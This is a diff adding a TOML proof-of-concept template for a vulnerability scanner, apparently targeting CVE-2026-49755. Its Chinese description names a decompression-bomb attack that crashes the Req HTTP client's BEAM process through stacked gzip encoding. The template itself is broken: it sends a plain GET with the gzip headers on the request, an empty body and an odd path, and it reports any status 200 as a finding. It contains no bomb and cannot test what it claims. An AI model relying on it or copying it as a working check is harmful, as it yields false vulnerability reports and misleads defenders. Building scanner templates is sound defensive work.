@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证目标是否存在解压炸弹拒绝服务漏洞：通过向Req客户端发送携带多层content-encoding: gzip且body为小型压缩炸弹的HTTP响应，触发内存耗尽导致BEAM进程崩溃"
+id = "POC-AVE-2026-0751"
+name = "CVE-2026-49755 PoC"
+severity = "high"
+tags = ["ave-2026-0751"]
+vuln_id = [
+    "CVE-2026-49755",
+    "AVE-2026-0751",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/vuln"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Encoding = "gzip, gzip, gzip"
+Content-Type = "application/gzip"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
